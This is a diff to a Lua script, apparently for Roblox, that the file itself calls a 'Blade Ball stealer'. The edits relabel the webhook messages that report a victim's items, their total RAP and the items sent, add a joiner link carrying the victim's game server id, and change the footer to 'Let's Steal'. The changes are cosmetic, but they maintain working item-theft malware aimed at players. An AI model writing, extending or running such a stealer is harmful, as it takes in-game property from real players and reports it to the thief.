@@ -152,13 +152,13 @@ local function SendJoinMessage(list, prefix)
             value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId
         },
         {
-            name = "Item list:",
+            name = "Item list 🟩:",
             value = "",
             inline = false
         },
         {
             name = "Summary:",
-            value = string.format("Total RAP: %s", formatNumber(totalRAP)),
+            value = string.format("Total RAP  🟩: %s", formatNumber(totalRAP)),
             inline = false
         }
     }
@@ -210,7 +210,7 @@ local function SendJoinMessage(list, prefix)
             ["color"] = 65280,
             ["fields"] = fields,
             ["footer"] = {
-                ["text"] = "Blade Ball stealer by Tobi. discord.gg/GY2RVSEGDT"
+                ["text"] = "Let's Steal"
             }
         }}
     }
@@ -234,13 +234,13 @@ local function SendMessage(list)
 			inline = true
 		},
 		{
-			name = "Items sent:",
+			name = "Items sent 🟥:",
 			value = "",
 			inline = false
 		},
         {
             name = "Summary:",
-            value = string.format("Total RAP: %s", formatNumber(totalRAP)),
+            value = string.format("Total RAP Sent 🟥: %s", formatNumber(totalRAP)),
             inline = false
         }
 	}
